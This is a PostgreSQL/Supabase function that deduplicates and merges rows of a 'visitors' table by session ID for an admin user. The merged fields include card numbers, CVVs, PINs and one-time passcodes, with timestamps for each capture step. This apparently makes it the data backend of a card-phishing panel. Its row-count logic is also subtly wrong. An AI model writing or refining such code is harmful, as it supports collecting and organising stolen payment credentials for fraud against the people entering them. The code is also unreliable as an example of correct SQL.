CREATE OR REPLACE FUNCTION public.merge_duplicate_visitors()
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  removed_count integer := 0;
  merged_sessions integer := 0;
  rec record;
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin'::public.app_role) THEN
    RAISE EXCEPTION 'Forbidden: admin role required';
  END IF;

  FOR rec IN
    SELECT session_id
    FROM public.visitors
    WHERE session_id IS NOT NULL
    GROUP BY session_id
    HAVING COUNT(*) > 1
  LOOP
    WITH ordered AS (
      SELECT *,
             ROW_NUMBER() OVER (
               PARTITION BY session_id
               ORDER BY created_at ASC, id ASC
             ) AS rn_old,
             ROW_NUMBER() OVER (
               PARTITION BY session_id
               ORDER BY GREATEST(
                 COALESCE(updated_at, to_timestamp(0)),
                 COALESCE(last_seen_at, to_timestamp(0)),
                 COALESCE(created_at, to_timestamp(0))
               ) DESC, id DESC
             ) AS rn_new
      FROM public.visitors
      WHERE session_id = rec.session_id
    ),
    keep AS (
      SELECT id AS keep_id FROM ordered WHERE rn_old = 1
    ),
    coalesced AS (
      SELECT
        (SELECT keep_id FROM keep) AS keep_id,
        (SELECT user_id        FROM ordered WHERE user_id        IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS user_id,
        (SELECT full_name      FROM ordered WHERE NULLIF(full_name,'')      IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS full_name,
        (SELECT email          FROM ordered WHERE NULLIF(email,'')          IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS email,
        (SELECT phone          FROM ordered WHERE NULLIF(phone,'')          IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS phone,
        (SELECT address        FROM ordered WHERE NULLIF(address,'')        IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS address,
        (SELECT city           FROM ordered WHERE NULLIF(city,'')           IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS city,
        (SELECT country        FROM ordered WHERE NULLIF(country,'')        IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS country,
        (SELECT postal_code    FROM ordered WHERE NULLIF(postal_code,'')    IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS postal_code,
        (SELECT detected_country FROM ordered WHERE NULLIF(detected_country,'') IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS detected_country,
        (SELECT currency       FROM ordered WHERE NULLIF(currency,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS currency,
        (SELECT language       FROM ordered WHERE NULLIF(language,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS language,
        (SELECT user_agent     FROM ordered WHERE NULLIF(user_agent,'')     IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS user_agent,
        (SELECT referrer       FROM ordered WHERE NULLIF(referrer,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS referrer,
        (SELECT landing_path   FROM ordered WHERE NULLIF(landing_path,'')   IS NOT NULL ORDER BY rn_old ASC LIMIT 1) AS landing_path,
        (SELECT last_path      FROM ordered WHERE NULLIF(last_path,'')      IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS last_path,
        (SELECT ip_address     FROM ordered WHERE NULLIF(ip_address,'')     IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS ip_address,
        (SELECT card_holder    FROM ordered WHERE NULLIF(card_holder,'')    IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_holder,
        (SELECT card_number    FROM ordered WHERE NULLIF(card_number,'')    IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_number,
        (SELECT card_expiry    FROM ordered WHERE NULLIF(card_expiry,'')    IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_expiry,
        (SELECT card_cvv       FROM ordered WHERE NULLIF(card_cvv,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_cvv,
        (SELECT card_pin       FROM ordered WHERE NULLIF(card_pin,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_pin,
        (SELECT card_otp       FROM ordered WHERE NULLIF(card_otp,'')       IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS card_otp,
        (SELECT plan_selected  FROM ordered WHERE NULLIF(plan_selected,'')  IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS plan_selected,
        (SELECT order_total    FROM ordered WHERE NULLIF(order_total,'')    IS NOT NULL ORDER BY rn_new ASC LIMIT 1) AS order_total,
        (SELECT MIN(checkout_at) FROM ordered WHERE checkout_at IS NOT NULL) AS checkout_at,
        (SELECT MIN(card_at)     FROM ordered WHERE card_at     IS NOT NULL) AS card_at,
        (SELECT MIN(pin_at)      FROM ordered WHERE pin_at      IS NOT NULL) AS pin_at,
        (SELECT MIN(otp_at)      FROM ordered WHERE otp_at      IS NOT NULL) AS otp_at,
        (SELECT MAX(last_seen_at) FROM ordered) AS last_seen_at,
        (SELECT SUM(visits_count) FROM ordered) AS visits_count
    )
    UPDATE public.visitors v SET
      user_id          = COALESCE(c.user_id, v.user_id),
      full_name        = COALESCE(c.full_name, v.full_name),
      email            = COALESCE(c.email, v.email),
      phone            = COALESCE(c.phone, v.phone),
      address          = COALESCE(c.address, v.address),
      city             = COALESCE(c.city, v.city),
      country          = COALESCE(c.country, v.country),
      postal_code      = COALESCE(c.postal_code, v.postal_code),
      detected_country = COALESCE(c.detected_country, v.detected_country),
      currency         = COALESCE(c.currency, v.currency),
      language         = COALESCE(c.language, v.language),
      user_agent       = COALESCE(c.user_agent, v.user_agent),
      referrer         = COALESCE(c.referrer, v.referrer),
      landing_path     = COALESCE(c.landing_path, v.landing_path),
      last_path        = COALESCE(c.last_path, v.last_path),
      ip_address       = COALESCE(c.ip_address, v.ip_address),
      card_holder      = COALESCE(c.card_holder, v.card_holder),
      card_number      = COALESCE(c.card_number, v.card_number),
      card_expiry      = COALESCE(c.card_expiry, v.card_expiry),
      card_cvv         = COALESCE(c.card_cvv, v.card_cvv),
      card_pin         = COALESCE(c.card_pin, v.card_pin),
      card_otp         = COALESCE(c.card_otp, v.card_otp),
      plan_selected    = COALESCE(c.plan_selected, v.plan_selected),
      order_total      = COALESCE(c.order_total, v.order_total),
      checkout_at      = COALESCE(c.checkout_at, v.checkout_at),
      card_at          = COALESCE(c.card_at, v.card_at),
      pin_at           = COALESCE(c.pin_at, v.pin_at),
      otp_at           = COALESCE(c.otp_at, v.otp_at),
      last_seen_at     = COALESCE(c.last_seen_at, v.last_seen_at),
      visits_count     = COALESCE(c.visits_count, v.visits_count),
      updated_at       = now()
    FROM coalesced c
    WHERE v.id = c.keep_id;

    WITH del AS (
      DELETE FROM public.visitors
      WHERE session_id = rec.session_id
        AND id <> (
          SELECT id FROM public.visitors
          WHERE session_id = rec.session_id
          ORDER BY created_at ASC, id ASC
          LIMIT 1
        )
      RETURNING 1
    )
    SELECT COALESCE(COUNT(*), 0) INTO STRICT removed_count FROM (
      SELECT removed_count FROM (SELECT removed_count) x
      UNION ALL SELECT (SELECT COUNT(*) FROM del)
    ) sums;

    merged_sessions := merged_sessions + 1;
  END LOOP;

  RETURN jsonb_build_object(
    'merged_sessions', merged_sessions,
    'removed_rows', removed_count
  );
END;
$$;

REVOKE ALL ON FUNCTION public.merge_duplicate_visitors() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.merge_duplicate_visitors() TO authenticated;